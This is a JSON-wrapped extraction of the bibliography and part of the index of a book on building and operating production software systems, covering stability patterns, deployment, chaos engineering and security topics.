      "content": "Bibliography\n\n[AHV94]\n\nSerge Abiteboul, Richard Hull, and Victor Vianu. Foundations of Databases. Addison-Wesley, Boston, MA, 1994.\n\n[BC00]\n\nCarliss Y. Baldwin and Kim B. Clark. Design Rules. MIT Press, Cambridge, MA, 2000.\n\n[Chi01]\n\nJames R. Chiles. Inviting Disaster: Lessons From the Edge of Technology. Harper Business, New York, NY, 2001.\n\n[Fow03] Martin Fowler. Patterns of Enterprise Application Architecture. Addison-\n\nWesley Longman, Boston, MA, 2003.\n\n[FPK17]\n\nNeal Ford, Rebecca Parsons, and Pat Kua. Building Evolutionary Architec- tures. O’Reilly & Associates, Inc., Sebastopol, CA, 2017.\n\n[Goe06]\n\nBrian Goetz. Java Concurrency in Practice. Addison-Wesley, Boston, MA, 2006.\n\n[Gol04]\n\nEliyahu Goldratt. The Goal. North River Press, Great Barrington, MA, Third edition, 2004.\n\n[HF10]\n\nJez Humble and David Farley. Continuous Delivery: Reliable Software Releases Through Build, Test, and Deployment Automation. Addison-Wesley, Boston, MA, 2010.\n\n[HMO14]\n\nJez Humble, Joanne Molesky, and Barry O’Reilly. Lean Enterprise: How High Performance Organizations Innovate at Scale. O’Reilly & Associates, Inc., Sebastopol, CA, 2014.\n\n[KDWH16] Gene Kim, Patrick Debois, John Willis, and Jez Humble. The DevOps\n\nHandbook. IT Revolution Press, Portland, Oregon, 2016.\n\n[Ken98] William Kent. Data and Reality. 1st Books, Bloomington, IL, 1998.\n\nreport erratum • discuss",
      "content_length": 1369,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 342,
      "content": "Bibliography • 338\n\n[Koz05]\n\nCharles Kozierok. The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference. No Starch Press, San Francisco, CA, 2005.\n\n[LW93]\n\nBarbara Liskov and J. Wing. Family Values: A Behavioral Notion Of Sub- typing. citeseer.ist.psu.edu/liskov94family.html. [MIT/LCS/TR-562b]:47, 1993.\n\n[Pet92]\n\nHenry Petroski. The Evolution of Useful Things. Alfred A. Knopf, Inc, New York, NY, 1992.\n\n[PP03]\n\nMary Poppendieck and Tom Poppendieck. Lean Software Development: An Agile Toolkit for Software Development Managers. Addison-Wesley, Boston, MA, 2003.\n\n[Rei09]\n\nDonald G. Reinertsen. The Principles of Product Development Flow: Second Generation Lean Product Development. Celeritas Publishing, Redondo Beach, CA, 2009.\n\n[She97] Michael Shermer. Why People Believe Weird Things. W.H.Freeman and\n\nCompany, New York, NY, 1997.\n\n[Sid11]\n\nSidney Sidney. Drift Into Failure. CRC Press, Boca Raton, FL, 2011.\n\n[Ste93]\n\nW. Richard Stevens. TCP/IP Illustrated, Volume 1: The Protocols. Addison- Wesley, Boston, MA, 1993.\n\n[Tal12]\n\nNassim Nicholas Taleb. Antifragile: Things That Gain From Disorder. Random House, New York, NY, 2012.\n\n[VCK96]\n\nJohn Vlissides, James O. Coplien, and Norman L. Kerth. Pattern Languages of Program Design 2. Addison-Wesley, Boston, MA, 1996.\n\n[Wei88]\n\nGerald M. Weinberg. General Principles of System Design. Dorset House, New York, NY, 1988.\n\nreport erratum • discuss",
      "content_length": 1420,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 343,
      "content": "DIGITS 12-factor app, 150–151 202 response code, back\n\npressure, 122\n\n403 Authentication Required response code, information leakage, 224\n\n5 a.m. problem, 38–43 503 Service Unavailable re-\n\nsponse code\n\nback pressure, 122 handshaking, 111 load shedding, 120, 184\n\nA abstraction\n\ndebugging integration\n\npoint failures, 36, 40, 43, 46\n\nivory tower architecture,\n\n5\n\nnetworks as, 36 sessions as, 58 sockets as, 36, 40\n\nactors\n\nback pressure, 121 let it crash pattern, 108–\n\n111\n\nadaptation, 289–324\n\nconcept leakage, 322 control of service identi-\n\nfiers, 316–318 convex returns, 290 create options, 307–313 decision cycle, 290–292 efficiency cautions, 300 embracing plurality, 321–\n\n322\n\nexplicit context, 306–\n\n307, 320\n\ninformation architecture,\n\n313–323\n\nloose clustering, 305 messages, events, and commands, 314–316 painless releases, 295 platform team, 292–294 process and organization,\n\n290–301\n\nservice extinction, 296–\n\n298\n\nsystem architecture, 301–\n\n313\n\nteam-scale autonomy,\n\n298\n\nthrashing, 292 URL dualism, 318–321\n\nadministration\n\n12-factor app checklist,\n\n151\n\nGUI interfaces, 131, 211 least privilege principle,\n\n231\n\nlive control API, 210 security misconfigura-\n\ntion, 225\n\nspecific network for ad- ministrative access, 145\n\nsplitting interfaces for se-\n\ncurity, 225\n\nadoption teams, 294 advanced persistent threat,\n\n60\n\nagile development, see al-\n\nso adaptation\n\nadoption teams, 294\n\nIndex\n\nadvantages, 4 change and, 289 decision loops, 291 airline case study, 9–21, 27–\n\n30, 98\n\nAkamai, 179 Akka, 108 aliases, service discovery with\n\nDNS, 173\n\nAlvaro, Peter, 334 Amazon Machine Images (AMIs), packaging, 245 Amazon Web Services (AWS) Code Pipeline, 243 concerns about dependen-\n\ncy on, 301\n\nin foundation layer, 152 Key Management Service\n\n(KMS), 226, 233\n\nS3 service outage, 195–\n\n197\n\nAmerican Registry for Internet Numbers (ARIN), 60, 285 AMIs (Amazon Machine Im- ages), packaging, 245\n\nAndera, Craig, 79 anti-CSRF token, 228 Antifragile, 328 antipatterns, stability,\n\nsee stability antipatterns\n\nApache httpd, 179 Apache Kafka, 315 API gateways, 227 APIs\n\nagreements, 264 API gateways, 227",
      "content_length": 2110,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 344,
      "content": "live control API, 210 security, 230 timeouts, 92 unbounded result sets,\n\n88\n\nvendor API libraries and integration point fail- ures, 44\n\nversioning breaking\n\nchanges, 265, 268–270\n\nversioning nonbreaking changes, 263–268\n\nAPM, 200 AppDynamics, 200 application performance\n\nmanagement, 201\n\napplication-layer firewalls,\n\n227\n\napplication-specific custom\n\nheaders, 269\n\narchitecture\n\nadaptation and informa- tion architecture, 313– 323\n\nadaptation and system\n\narchitecture, 301–313\n\ncomponent-based, 302 event-based, 304 evolutionary, 296, 302–\n\n313\n\nlayered, 302–303 pragmatic vs. ivory tower,\n\n5\n\nservice-oriented, 101 shared-nothing, 70, 74 ARIN (American Registry for Internet Numbers), 60, 285\n\nassets, deployment, 255 assignment, 244 ATG-based infrastructure\n\npage request handling,\n\n133\n\nself-denial attacks, 70\n\nattack surface, 225 augmenting modular opera-\n\ntor, 310\n\nauthentication\n\ncontainers, 150 first-party, 221 number of attempts al-\n\nlowed, 220\n\nsecurity, 218–222 session fixation, 218 session prediction attack,\n\n219\n\nthird-party, 221\n\nautomation\n\nchaos engineering, 334 data collection for prob-\n\nlems, 12\n\ndeployment, 242–246 efficiency cautions, 301 force multiplier antipat- tern, 80–84, 123, 194 governor pattern, 123–\n\n125, 194\n\nHTTP APIs, 210 lack of judgment, 197 mapping, 246 speed of failure, 196 autonomy, team-scale, 298 autoscaling, see also scaling chain reactions, 49 costs, 52, 77, 202 force multiplier antipat- tern, 81, 123, 196 let it crash pattern, 110 pre-autoscaling, 71 self-denial attacks, 71 unbalanced capacities,\n\n77\n\nvirtual machines in the\n\ncloud, 153\n\nAWS, see Amazon Web Ser-\n\nvices (AWS)\n\nB back pressure\n\nwith load shedding, 120,\n\n122\n\nstability pattern, 120–123 unbalanced capacities,\n\n76\n\nbackoff algorithms, 80 backups\n\n12-factor app checklist,\n\n151\n\npartitioning traffic, 145 serialization and session failover in ecommerce case study, 287 Baldwin, Carliss Y., 308–313 bastion servers, 153 bell-curve distribution, 88 bidirectional certificates, 230 Big-IP, 180 binding\n\nports, 151 process binding, 100 black box technology, 165–\n\n169\n\nIndex • 340\n\nBlack Friday case study, 129–\n\n139, 163\n\nBlack Monday example, 86–\n\n89\n\nblacklists, 227 blocked threads, see threads,\n\nblocked\n\nblocking, scrapers and spi-\n\nders, 60, 285\n\nblue/green deployments, 295 bogons, 55, 185 bonding interfaces, 144 Bonnie 64, 147 broadcasts, 73 broken access control, 222–\n\n224\n\nbuffers, queue backups, 183 Building Evolutionary Architec-\n\ntures, 302\n\nbuilds\n\n12-factor app checklist,\n\n151\n\nbuild pipeline as continu- ous integration server, 243\n\ncontainer security, 232 deployment and build\n\npipeline, 243–247, 261 manual checks for deploy-\n\nment, 247\n\npackage repository, 208 security, 157, 208\n\nbulkheads\n\nAPI security, 230 physical redundancy as,\n\n98\n\nprocess binding, 100 splitting chain reactions,\n\n47, 49\n\nstability pattern, 98–101 unbalanced capacities,\n\n76\n\nbutterfly integration points\n\ndiagram, 33\n\nC C#, method synchronization,\n\n65\n\ncache busting, 255 caching\n\nblocked threads example,\n\n64–66\n\ncache busting, 255 cautions, 67 flushes, 105, 164, 210",
      "content_length": 3085,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 345,
      "content": "invalidation strategy, 67,\n\n105\n\nleast recently used (LRU)\n\nalgorithms, 105\n\nlive control, 210 memory leaks, 105 memory limits, 67, 105 metrics, 206 monitoring hit rates, 67 proxies, 66 service discovery, 188 sessions, 58 shared resources scaling\n\neffects, 75\n\nstability problems, 105 weak references, 67 working-set algorithms,\n\n105 calendars, 129 canary deployments, 209,\n\n257, 295\n\nCAP theorem, 188 capacity\n\ncrushed ecommerce site case study, 284–288\n\ndefined, 52 demand control, 182–186 drift and, 327 judging load capacity by concurrent users, 281 judging load capacity by\n\nsessions, 281\n\nmodeling, 77 unbalanced capacities stability antipattern, 75–78, 112\n\nuser stability antipat-\n\nterns, 51–55 cascading failures\n\nblocked threads, 50, 68 chain reactions, 48 circuit breakers, 50, 98 fail fast pattern, 107 slow responses, 85 stability antipattern, 49–\n\n51\n\ntimeouts, 50, 94, 107\n\ncase studies\n\nabout, xiv airline, 9–21, 27–30, 98 Black Friday, 129–139,\n\n163\n\ncrushed ecommerce site,\n\n277–288\n\ndeployment army, 237–\n\n239\n\nusing postmortems, 14–\n\n18\n\ncatalog service example, 316–\n\n318\n\ncertificate revocation list\n\n(CRL), 227\n\ncertificates\n\nAPI security, 230 bidirectional, 230 certificate revocation list\n\n(CRL), 227\n\nproblems with, 219\n\nCERTs, 234 chain of custody, 157 chain reactions\n\nblocked threads, 48, 68 cascading failures, 48 splitting, 47, 49 stability antipattern, 46–\n\n49\n\nchannel partners and self-de-\n\nnial attacks, 70\n\nchannels, back pressure, 121 Chaos Automation Platform\n\n(ChAP), 334\n\nchaos engineering, 325–336 automation and repeti-\n\ntion, 334\n\ncautions, 332, 334 defined, 325 designing the experiment,\n\n331\n\ndisaster simulations, 335 environments, 325 injecting chaos, 331–332 precursors, 326–328 prerequisites, 330 Simian Army, 328–335 targeting chaos, 333 test harnesses, 116\n\nChaos Monkey, 328–335 ChAP (Chaos Automation\n\nPlatform), 334\n\nChiles, James R., 26, 32 Chrome, SameSite attribute,\n\n228\n\nCI, see continuous integration circuit breakers\n\nblocking scrapers and\n\nspiders, 60\n\ncascading failures, 50, 98 chain reactions, 49 distributed denial-of-ser- vice (DDoS) attacks, 61\n\nfail fast pattern, 106 generic gateways, 93 handshaking, 112\n\nIndex • 341\n\nintegration point failures,\n\n45–46, 98\n\nlet it crash pattern, 111 live control, 210 logging, 97 scope, 97 slow responses, 98 stability pattern, 95–98 thresholds, 96 with timeouts, 94, 98 unbalanced capacities,\n\n76, 98\n\nClark, Kim B., 308–313 classes, power-law distribu-\n\ntion, 304\n\ncleanup phase of deployment,\n\n259\n\nclocks and virtual machines,\n\n148 cloud\n\n12-factor app, 151 bulkheads, 99 certificate management,\n\n220\n\ncontainers in, 153 networking and founda- tion layer, 142–146 virtual machines in, 152\n\nCloudFoundry, 212 clustering\n\ncluster managers and\n\nvirtual machines, 148\n\nloose, 305 migratory virtual IP ad- dresses and cluster servers, 189\n\nSimian Army, 328–335 code, see also partitioning\n\nguidelines for, 157–160 native, 87 separating out log files,\n\n166\n\ncommand objects, 64 command queue, 211 command-query responsibili- ty segregation (CQRS), 64, 315\n\ncommands\n\nin information architec-\n\nture, 314–316 live control, 210\n\nCommon Weakness Enumer-\n\nation 22, 224 communication\n\nConway’s law, 279 decision cycle, 290–292",
      "content_length": 3224,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 346,
      "content": "efficiency concerns, 301 embracing plurality, 321–\n\n322\n\npoint-to-point communi- cation scaling effects, 72–73, 75\n\nself-denial attacks, 71 team-scale autonomy,\n\n298\n\ncompetitive intelligence, 59–\n\n60, 285\n\ncompliance requirements, log\n\nfiles, 104\n\ncomponent-based architec-\n\nture, 302 components\n\ncomponent-based archi-\n\ntecture, 302\n\nwith known vulnerabili-\n\nties, 229\n\nlet it crash pattern, 108–\n\n111\n\nrestarting in Recovery- Oriented Computing, 138\n\nconcept leakage, 322 concurrency\n\n12-factor app checklist,\n\n151\n\nchaos engineering, 326 Command Query Respon- sibility Separation, 64 synchronization of meth-\n\nods, 65 configuration\n\n12-factor app checklist,\n\n151\n\nconfiguration manage-\n\nment tools guidelines, 206–207\n\ndeployment and configu- ration management tools, 244\n\nwith disposable infras-\n\ntructure, 161\n\ndogpiles and configura-\n\ntion management tools, 79\n\nfiles, 160 guidelines for, 160–162 immutable infrastruc-\n\nture, 158\n\ninjection and containers,\n\n150\n\nlive control, 210 naming properties, 162\n\nparameters and implicit\n\ncontext, 307\n\nper-environment, 161 security, 161\n\nconnections\n\ndatabase connection pools and blocked threads, 64, 68\n\ndead connection detec-\n\ntion, 42\n\nduration of TCP, 40 live control, 210 metrics, 205 outbound, 146 queue backups, 183 test harnesses, 114–117\n\nconsensus, quorum-based,\n\n206\n\nconstraints and rollout, 260–\n\n261\n\nConsul, 172, 189 containers\n\nin cloud, 153 credentials, 150 data collection for debug-\n\nging, 152\n\ndiscovery services, 188 elastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146,\n\n149–153\n\nimmutable infrastruc-\n\nture, 159\n\nleast privilege principle,\n\n231\n\nload balancing, 150 log collectors, 204 log files, 166 packaging, 245 ports, 149 security, 225, 231 software-defined network-\n\ning, 187\n\ncontent-based routing, 181 context, implicit, 306 context, explicit, 306–307,\n\n320\n\nContinuous Delivery, 295 continuous deployment,\n\nsee deployment\n\ncontinuous integration build pipeline, 243 container security, 232\n\ncontract tests, 267, 272\n\nIndex • 342\n\ncontrol plane\n\nconfiguration services,\n\n206–207\n\ncontainers, 149–152 control plane layer, 141,\n\n193–214 costs, 194 defined, 193 development environ-\n\nment, 199\n\ndiscovery services, 189 force multiplier antipat-\n\ntern, 83–84\n\nin layer diagram, 141 level of, 193 live control, 209–212 platform and ecosystem,\n\n197–199\n\nplatform services, 212–\n\n213\n\nshopping list, 213 transparency, 200–206 virtual machines in the\n\ncloud, 152\n\ncontrollers, versioning API\n\nchanges, 270\n\nconvergence, 245, 257 conversion rate, 56 convex returns, 290 Conway’s law, 278–279 Conway, Melvin, 279 cookies\n\ncross-site request forgery\n\n(CSRF), 228 development, 58 exchanging session IDs,\n\n219\n\ngateway page, 286 pairing, 229 scrapers and spiders, 59–\n\n60\n\nsecurity, 58, 219 sticky sessions and load\n\nbalancers, 181\n\nunwanted user problems,\n\n57–60\n\ncoordinated deployments, 299 CORBA, 18 core dumps and password\n\nsecurity, 233\n\ncore facilities (CF) airline case study, 9–21, 27–30, 98\n\ncosts\n\nairline case study, 14 autoscaling, 52, 77, 202 caching, 67",
      "content_length": 3054,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 347,
      "content": "control plane, 194 crushed ecommerce site\n\ncase study, 288\n\ndeployment, 239 designing for production,\n\n3\n\nload testing, 26 platforms, 202 poor stability, 23 real-user monitoring\n\n(RUM) services, 201\n\nreleases, 295 runtimes, 202 security, 215 transparency and econom-\n\nic value, 201\n\nunplanned operations,\n\n202\n\ncoupling, see also decoupling\n\nmiddleware\n\nairline case study, 28–29 avoiding with log files,\n\n165\n\nbulkheads, 99 coordinated deployments,\n\n299\n\ndesigning for transparen-\n\ncy, 164\n\nfailure propagation, 29,\n\n32\n\nhorizontal, 302 microservices, 303 porting and, 312 self-denial attacks, 70 white-box technology ,\n\n165\n\nCQRS (command-query re- sponsibility segregation), 64, 315\n\ncrashes, let it crash stability\n\npattern, 108–111\n\ncredentials, see authentica-\n\ntion; certificates; passwords\n\ncredit card tokenizer, 226 CRL (certificate revocation\n\nlist), 227\n\ncron jobs and dogpiles, 79 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228\n\nCSRF (cross-site request\n\nforgery), 228\n\ncunning malevolent intelli-\n\ngence, 334\n\nCuriosity rover, 290\n\nCVEs, 229, 234 CWEs, 234\n\nD data, purging, 102, 107 data collection\n\nairline case study, 12,\n\n14–20\n\nautomated, 12 containers, 152 thread dumps, 16–18,\n\n135\n\ntransparency, 163–170 data encryption keys, 226,\n\n233\n\ndatabase administrators, role,\n\n198\n\ndatabases\n\nadministrator’s role, 198 cascading failures, 49 configuration services,\n\n206\n\nconfigured passwords,\n\n232\n\nconnection pools and\n\nblocked threads, 64, 68\n\nconstraints, 260–261 data purging, 102, 107 dead connection detec-\n\ntion, 42\n\ndeployment, 250–255,\n\n259–261\n\ndirect object access, 223 fail fast pattern, 106 implicit context, 307 injection vulnerabilities,\n\n216–218\n\nlive control, 210 metrics, 205 migrations frameworks,\n\n250, 260\n\nmigratory virtual IP ad-\n\ndresses, 190\n\nMongoDB hostage attack,\n\n225\n\nparadigm, 313 sensitive data exposure,\n\n226\n\nshims, 250, 259 translation pipeline, 252 trickle, then batch, 254–\n\n255\n\ntriggers, 250, 259 unbounded result sets,\n\n86–90, 94\n\nURL dualism, 318–321 URL probing, 223\n\nDatadog, 200\n\nIndex • 343\n\nDDoS (distributed denial-of-\n\nservice) attacks, 61\n\ndead connection detection, 42 deadlocks\n\nchain reactions, 49 connection pools, 68 timeouts, 69 vendor API libraries, 44\n\ndebug logs, 167 deceleration zones, 84 decision cycle, 290–292 decoupling middleware\n\nintegration point failures,\n\n45–46, 117\n\nself-denial attacks, 70 stability pattern, 117–119 total decoupling, 119\n\nDekker, Sidney, 327 delivery\n\navoiding thrashing, 292 continuous, 295 guidelines, 245\n\ndemand control, 182–186, see\n\nalso capacity\n\nDeming/Shewhart cycle, 291 denial attacks\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nself-denial attacks, 69–\n\n71, 76 dependencies\n\n12-factor app checklist,\n\n151\n\ndependency on request,\n\n148\n\nhealth checks, 184 implicit, 306 loose clustering, 305 porting, 312 security, 158, 229 splitting modules, 308 team-scale autonomy,\n\n299\n\ntest harnesses, 116 URL dualism, 318\n\ndeployment\n\nassignment, 244 automated, 242–246 avoiding planned down-\n\ntime, 242\n\nblue/green deployments,\n\n295\n\nbuild pipeline and, 243–\n\n247, 261\n\ncache busting, 255",
      "content_length": 3138,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 348,
      "content": "canary deployments,\n\n209, 257, 295\n\ncase study, 237–239 choices, 241 cleanup phase, 259 continuous, 246–260 convergence, 245, 257 coordinated deployments,\n\n299\n\ncosts, 239 databases, 250–255,\n\n259–261 defined, 156 delivery guidelines, 245 deployment services guidelines, 207\n\ndesigning for, 241–262 diagram, 156 drain period, 249 immutable infrastruc-\n\nture, 245\n\nmanual checks, 247 packaging, 245 painless releases, 295 phases, 248–260 placement services, 209 preparation, 248–257 risk cycle, 246 rolling, 248 rollout phase, 257–259 session affinity, 255 speed, 246, 248, 257 time-frame, 248–250 trickle, then batch, 254–\n\n255\n\nversioning, 255 in waves, 295 web assets, 255\n\nDesign Rules, 308 destination unreachable re-\n\nsponse, 187\n\ndevelopment environment\n\nquality of, 199 security, 208 DevOps, fallacy of, 294 The DevOps Handbook, 300 direct object access, 223 directory traversal attacks,\n\n224\n\ndisaster recovery\n\ndisaster simulations, 335 global server load balanc-\n\ning, 180\n\nhardware load balancing,\n\n180 discovery services DNS, 172–173\n\nforce multiplier antipat-\n\ntern, 81\n\nguidelines, 188 interconnection layer,\n\n172, 188\n\nopen-source, 172\n\ndisposability\n\n12-factor app checklist,\n\n151\n\nconfiguration, 161 immutable infrastruc-\n\nture, 158\n\ndistributed denial-of-service\n\n(DDoS) attacks, 61\n\nDNS\n\navailability of, 177 global server load balanc-\n\ning, 175–177\n\ninterconnection layer,\n\n173–177\n\nload balancing, 173–177 resolving hostnames, 143 round-robin load balanc-\n\ning, 173–174\n\nservice discovery with,\n\n172–173\n\nDocker Swarm, 149, 189, 212 dogpile antipattern, 78–80,\n\n211\n\ndomain name, fully qualified,\n\n143\n\ndomain objects\n\navoiding bad layering,\n\n303\n\nimmutable, 64 synchronizing methods\n\non, 64–66\n\ndowntime, fallacy of planned,\n\n242\n\ndrain period, 249 drift, 327 Drift into Failure, 327 dynamic generation problems in ecommerce case study, 287\n\nE EC2, 161 Edge, SameSite attribute, 228 efficiency, cautions, 300 EIA-232C, 111 EJB (Enterprise JavaBeans),\n\n18, 27\n\nelastic scaling, deployment\n\ntools, 208\n\nIndex • 344\n\nElasticsearch, 204 Elixir and actors, 108 embracing plurality, 321–322 encryption\n\nKey Management Service\n\n(KMS), 226, 233\n\npassword vaulting, 232 sensitive data, 226 enterprise application integra- tion, see decoupling middle- ware\n\nEnterprise JavaBeans (EJB),\n\n18, 27\n\nenterprise systems, DNS\n\nround-robin load balancing, 174\n\nenumeration, machine, 187 environments\n\nchaos engineering, 325 development environ-\n\nment, 199, 208\n\nper-environment configu-\n\nration, 161\n\nquality assurance (QA) environment, 199\n\ntest, 251 Equifax, 215, 229 Erlang and actors, 108 errors\n\ndefined, 28 logging, 166 etcd, 161, 188, 206 Ethereal, see Wireshark Ethernet and NICs, 143 Etsy, 239 event bus, persistent, 315 event journal, 315 event notification, 314 event ordering, 148 event sourcing, 315 event-based architecture, 304 event-carried state transfer,\n\n314 events\n\nevent-based architecture,\n\n304\n\nin information architec-\n\nture, 314–316\n\nordering, 148 as term, 314 The Evolution of Useful\n\nThings, 301\n\nevolutionary architecture,\n\n296, 302–313",
      "content_length": 3068,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 349,
      "content": "exceptions, logging, 166 excluding modular operator,\n\n310\n\nexecutables, defined, 156 explicit context, 306–307, 320 extinction, service, 296–298\n\nF Facebook, number of users,\n\n31 fail fast\n\nlatency problems, 94 slow responses, 86, 107 stability pattern, 106–108\n\nfailure, see also cascading\n\nfailures\n\nchain of failure, 28–30 defined, 29 isolation and splitting\n\nmodules, 309\n\nmodes, 26–28 modes and size, 32 stopping crack propaga-\n\ntion, 27–29\n\nfailure injection testing (FIT),\n\n332\n\nfailures, cascading, see cas-\n\ncading failures\n\nFamily Values: A Behavioral Notion of Subtyping, 65\n\nFarley, Dave, 295 fault density, 97 faults\n\ndefined, 28 fault density, 97 fault isolation with time-\n\nouts, 92\n\nfeature toggles, 210, 260 feedback\n\navoiding thrashing with,\n\n292\n\npainless releases, 295\n\nFight Club bugs, 71 filenames and directory traversal attacks, 224 Firefox, SameSite attribute,\n\n228 firewalls\n\napplication-layer, 227 blocking scrapers and\n\nspiders, 60\n\nbreaches and administra- tive access-only net- works, 145\n\ndefined, 40\n\nduration of connections,\n\n41\n\nsoftware-defined network-\n\ning, 187\n\nFIT (failure injection testing),\n\n332\n\nFIT tests, see contract tests force multiplier antipattern,\n\n80–84, 123, 194\n\nFord, Neal, 302 form follows failure, 301 foundation layer, 141–154 in layer diagram, 141 networking, 142–146 physical hosts, virtual\n\nmachines, and contain- ers, 146–153 Fowler, Martin, 314 FQDN (fully qualified domain\n\nname), 143\n\nframing, request, 264, 269 fully qualified domain name\n\n(FQDN), 143\n\nfunctional testing, test har-\n\nnesses, 45, 116\n\nG gaps\n\ngenerative testing for,\n\n266\n\ntesting gap in ecommerce\n\ncase study, 285\n\ngarbage collector\n\ncaching without memory\n\nlimits, 67\n\nweak references, 53–54,\n\n67 gateways\n\nAPI gateways, 227 default, 186 ecommerce case study,\n\n286\n\nenabling cookies, 286 generic, 93\n\nGeneral Principles of Systems\n\nDesign, 327\n\ngenerative testing, for gaps,\n\n266\n\ngeneric gateways, 93 global server load balancing\n\ndisaster recovery, 180 with DNS, 175–177 global state and implicit con-\n\ntext, 307\n\nIndex • 345\n\nglobalObjectCache, blocked\n\nthreads example, 64–66\n\nThe Goal, 300 GoCD, 243 Goetz, Brian, 62 governor stability pattern,\n\n123–125, 194, 296 Gregorian calendar, 129 GSLB, see global server load\n\nbalancing\n\nGUI interfaces, 131, 211 Gunther, Neil, 184\n\nH handshaking\n\nintegration point failures,\n\n46\n\nstability pattern, 111–113 TCP, 36, 111, 183 unbalanced capacities,\n\n76, 112 HAProxy, 179 headers, versioning with,\n\n264, 269 health checks\n\nchain reaction example,\n\n48\n\nwith Consul, 189 global server load balanc-\n\ning, 175\n\nguidelines, 169, 180 handshaking, 112 instances, 169, 180 load shedding, 184 report criteria, 258 rollouts, 258 VIP pool information, 178\n\nheap memory, traffic prob-\n\nlems, 52–54\n\nHeroku\n\n12-factor app, 151 environment variables,\n\n161 Hickey, Rich, 265 hijacking, session, 218–222 horizontal coupling, 302 horizontal scaling, see scaling hostnames\n\ndefined, 143 machine identity, 143–\n\n146, 152\n\nvirtual machines in the\n\ncloud, 152",
      "content_length": 3017,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 350,
      "content": "hosts\n\nconfiguration mapping,\n\n244\n\nDNS servers, 177 elastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146 virtual machines in the\n\ncloud, 152\n\nHTTP\n\nabout, 58 API agreements, 264 handshaking problems,\n\n111\n\nHTTP Strict Transport\n\nSecurity, 226\n\nintegration point failures,\n\n43\n\nlive control APIs, 210 specification, 264 versioning with, 264, 269\n\nhttpd, 179 Humble, Jez, 295 hysteresis, 84, see also gover-\n\nnor stability pattern\n\nI IaaS (infrastructure-as-a-ser-\n\nvice), 246\n\nidentifiers, services, 316–318 ignorance, principle of, 305 immutable infrastructure code guidelines, 158 deployment, 245 domain objects, 64 packaging, 245 rollout example, 258 steady state pattern, 101\n\nimplicit context, 306 impulse, defined, 24 inbound testing, 266 indexing, log, 204 information architecture and\n\nadaptation, 313–323 information leakage, 224 infrastructure, see immutable\n\ninfrastructure\n\ninfrastructure-as-a-service\n\n(IaaS), 246\n\ninjection vulnerabilities, 216–\n\n218\n\ninstallation\n\ndefined, 156 deployment and, 245\n\ninstances\n\nChaos Monkey, 331 code guidelines, 157–160 configuration guidelines,\n\n160–162 defined, 155 health checks, 169, 180 instances layer, 141,\n\n155–170\n\ninterconnection layer,\n\n171–191\n\nin layer diagram, 141 let it crash pattern, 109 live control and speed,\n\n209\n\nload balancing, 173–182 loose clustering, 305 metrics, 169 porting modules, 312 transparency guidelines, 162–170, 200–206 insufficient attack prevention,\n\n227\n\nintegration points\n\ncascading failures, 50 circuit breakers, 45–46,\n\n98\n\ndecoupling middleware,\n\n45–46, 117\n\nexpensive users, 56 fail fast pattern, 106 HTTP protocols, 43 live control, 210 metrics, 205 retailer example, 35 socket-based protocols,\n\n35–43\n\nstability antipatterns, 33–\n\n46, 94\n\nstrategies for, 45–46 vendor API libraries, 44\n\nintegration testing\n\nexplicit context, 307 overspecification, 272 test harnesses, 45, 113–\n\n117\n\nintelligence, cunning malevo-\n\nlent, 334\n\ninterconnection\n\ndemand control, 182–186 different solutions for dif-\n\nferent scales, 172\n\nDNS, 173–177 interconnection layer,\n\n141, 171–191\n\nin layer diagram, 141,\n\n171\n\nload balancing, 173–182\n\nIndex • 346\n\nmigratory virtual IP ad-\n\ndresses, 189\n\nnetwork routing, 186–188 service discovery with\n\nDNS, 172–173\n\nservice discovery with\n\ndiscovery services, 188\n\ninterfaces\n\nbonding, 144 enumeration problems,\n\n187\n\nmachine identity, 143–\n\n146, 153\n\nInternet Explorer, SameSite\n\nattribute, 228\n\nInternet of Things, security,\n\n61\n\nintrusion detection software,\n\n232\n\ninvalidating, cache, 67, 105 inversion modular operator,\n\n311\n\ninvestigations, see post-\n\nmortems\n\nInviting Disaster, 26, 32 IP addresses, see also virtual\n\nIP addresses\n\nblocking specific, 285,\n\n287\n\nbonding interfaces, 144 containers, 149–150 default gateways, 186 load balancing with DNS,\n\n173–177\n\noutbound connections,\n\n146\n\nresolving hostnames,\n\n143, 145\n\nvirtual LANs (VLANs),\n\n149–150, 187\n\nvirtual extensible LANs\n\n(VXLANs), 150\n\nvirtual machines in the\n\ncloud, 152\n\nisolation\n\ncontainers, 231 failure isolation and\n\nsplitting modules, 309 fault isolation with time-\n\nouts, 92\n\nlet it crash pattern, 108 test harnesses, 114 ivory tower architecture, 5\n\nJ Java\n\nactors, 108",
      "content_length": 3185,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 351,
      "content": "DNS round-robin load\n\nbalancing, 174\n\nJava Encoder Project,\n\n222\n\nmethod synchronization,\n\n65\n\nthread dumps, 16–18 Java Concurrency in Practice,\n\n62\n\nJava Encoder Project, 222 java.util.logging and thread\n\ndumps, 17 JDBC driver\n\nairline case study, 20 migratory virtual IP ad-\n\ndresses, 190 SQLException, 20 unbounded result sets,\n\n87 Jenkins, 243 Jones, Nora, 332 Julian calendar, 129 jumphost servers, 153 JVM, warm-up period, 209\n\nK Kafka, 315 Kerberos, 220–221 key encryption keys, 226, 233 Key Management Service\n\n(KMS), 226, 233\n\nKibana, 204 kill, Java thread dumps, 16 KMS (Key Management Ser-\n\nvice), 226, 233 Kua, Patrick, 302 Kubernetes, 149, 212\n\nL landing zones, self-denial at-\n\ntacks, 71\n\nlast responsible moment, 119 latency\n\ndata purging, 102 fail fast, 94 as lagging indicator, 134 Latency Monkey, 331 test harnesses, 116 timeouts, 94 Latency Monkey, 331 layer 7 firewalls, 227 layered architecture, 302–303 leader election, 206, 305 Leaky Bucket pattern, 97\n\nlean development and deci-\n\nsion loops, 291 Lean Enterprise, 300 Lean Software Development,\n\n300\n\nleast privilege principle, 231 